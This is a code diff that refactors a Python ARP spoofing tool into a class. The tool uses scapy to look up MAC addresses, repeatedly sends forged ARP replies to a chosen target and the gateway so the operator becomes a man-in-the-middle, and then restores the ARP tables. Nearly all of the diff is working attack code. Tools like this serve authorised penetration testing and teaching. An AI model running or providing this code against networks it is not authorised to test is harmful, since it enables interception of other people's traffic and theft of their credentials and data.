@@ -10,79 +10,88 @@ import sys
 import scapy.all as scapy
 from termcolor import colored
 
-# Verify correct format of given arguments and root privilege
-def verify(target, interface, router_ip, hwsrc):
+class ArpSpoof:
 
-    ip_re = r"^([0-9]{1,3}\.){3}[0-9]{1,3}$"
+    def __init__(self, t, i, r, h):
+        self.target_mac = None 
+        self.router_mac = None
+        self.target = t
+        self.interface = i
+        self.router_ip = r
+        self.hwsrc = h
+        self.isValid = None
+        self.event = False
 
-    match = True if re.match(ip_re, target) else False # Verify target format
-    match_router = True if re.match(ip_re, router_ip) else False # Verify gateway format
-    match_mac = True if re.match(r"^([a-fA-F0-9]{0,2}\:){5}[a-fA-F0-9]{0,2}$", hwsrc) else False # Verify mac address format
+    # Verify correct format of given arguments and root privilege
+    def verify(self):
 
-    interfaces = [i[1] for i in socket.if_nameindex()] # Get all Local Network Interfaces Names
-    valid_interface = True if interface in interfaces else False # Verify if the given Network Interface Name is in the PC
+        ip_re = r"^([0-9]{1,3}\.){3}[0-9]{1,3}$"
 
-    return match and valid_interface and match_router and match_mac # Return True if all is correct
+        match = True if re.match(ip_re, self.target) else False # Verify target format
+        match_router = True if re.match(ip_re, self.router_ip) else False # Verify gateway format
+        match_mac = True if re.match(r"^([a-fA-F0-9]{0,2}\:){5}[a-fA-F0-9]{0,2}$", self.hwsrc) else False # Verify mac address format
 
-# Get destination mac from target
-def get_dst_mac(ip, interface, retries=40):
-    for retry in range(retries):
-        try:
-            arp_packet = scapy.ARP(pdst=ip)
-            broadcast_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
+        interfaces = [i[1] for i in socket.if_nameindex()] # Get all Local Network Interfaces Names
+        valid_interface = True if self.interface in interfaces else False # Verify if the given Network Interface Name is in the PC
 
-            arp_packet = broadcast_packet / arp_packet
+        self.isValid = match and valid_interface and match_router and match_mac # Return True if all is correct
 
-            answered_list = scapy.srp(arp_packet, iface=interface, timeout=1, verbose=False)[0] # get the anwers
+    # Get destination mac from target
+    def get_dst_mac(self, ip, retries=20):
+        for retry in range(retries):
+            try:
+                arp_packet = scapy.ARP(pdst=ip)
+                broadcast_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
 
-            if answered_list:
-                return answered_list[0][1].hwsrc # get and return the hardware source (Mac Address)
-        except:
-            pass
+                arp_packet = broadcast_packet / arp_packet
 
-    else:
-        return None
-    
-# Send spoof message to convert you in a MITM
-def spoof(target_ip, interface, router_ip, hwsrc, hwdst):
-    arp_packet = scapy.ARP(op=2, pdst=target_ip, psrc=router_ip, hwsrc=hwsrc, hwdst=hwdst)
-    broadcast_packet = scapy.Ether(dst=hwdst)
+                answered_list = scapy.srp(arp_packet, iface=self.interface, timeout=1, verbose=False)[0] # get the anwers
 
-    packet = broadcast_packet/arp_packet
+                if answered_list:
+                    return answered_list[0][1].hwsrc # get and return the hardware source (Mac Address)
+            except:
+                pass
 
-    scapy.sendp(packet, verbose=False, iface=interface)
-
-def revert_spoof():
-    global target_mac, router_mac, interface, target, router_ip
-
-    for _ in range(5):
-        # Revert for target
-        spoof(target, interface, router_ip, target_mac, router_mac)
+        else:
+            return None
         
-        # Revert for router
-        spoof(router_ip, interface, target, router_mac, target_mac)
-        time.sleep(0.2)
+    # Send spoof message to convert you in a MITM
+    def spoof(self, target_ip, interface, router_ip, hwsrc, hwdst):
+        arp_packet = scapy.ARP(op=2, pdst=target_ip, psrc=router_ip, hwsrc=hwsrc, hwdst=hwdst)
+        broadcast_packet = scapy.Ether(dst=hwdst)
 
-# Main logic
-def main(t, i, r, h, event, isValid):
-    global target_mac, router_mac, target, interface, router_ip, hwsrc
+        packet = broadcast_packet/arp_packet
 
-    target, interface, router_ip, hwsrc = [t, i, r, h] # get arguments
+        scapy.sendp(packet, verbose=False, iface=interface)
 
-    if isValid:
-        target_mac =  get_dst_mac(target, interface)
-        router_mac =  get_dst_mac(router_ip, interface)
-    
-        if not target_mac or not router_mac:
-            print(colored("\n[!] Error: Failed to get destination mac address.\n", "red"))
+    def revert_spoof(self):
+        if self.event:
+            for _ in range(10):
+                # Revert for target
+                self.spoof(self.target, self.interface, self.router_ip, self.target_mac, self.router_mac)
+                
+                # Revert for router
+                self.spoof(self.router_ip, self.interface, self.target, self.router_mac, self.target_mac)
+                time.sleep(0.3)
+
+    # Main logic
+    def start(self, _):
+
+        if self.isValid:
+            self.target_mac =  self.get_dst_mac(self.target)
+            self.router_mac =  self.get_dst_mac(self.router_ip)
+        
+            if not self.target_mac or not self.router_mac:
+                print(colored("\n[!] Error: Failed to get destination mac address.\n", "red"))
+                sys.exit(1)
+
+            print(colored(f"\n[+] Now you are a Man-In-The-Middle for {self.target} target.", "blue"))
+            while not self.event:
+                self.spoof(self.target, self.interface, self.router_ip, self.hwsrc, self.target_mac)
+                self.spoof(self.router_ip, self.interface, self.target, self.hwsrc, self.router_mac)
+
+                time.sleep(2)
+
+        else:
+            print(colored("\n[!] Arguments Incorrect Format.\n", "red"))
             sys.exit(1)
-
-        print(colored(f"\n[+] Now you are a Man-In-The-Middle for {target} target.", "blue"))
-        while not event.is_set():
-            spoof(target, interface, router_ip, hwsrc, target_mac)
-            spoof(router_ip, interface, target, hwsrc, router_mac)
-
-            time.sleep(2)
-    else:
-        print(colored("\n[!] Arguments Incorrect Format.\n", "red"))
-        sys.exit(1)
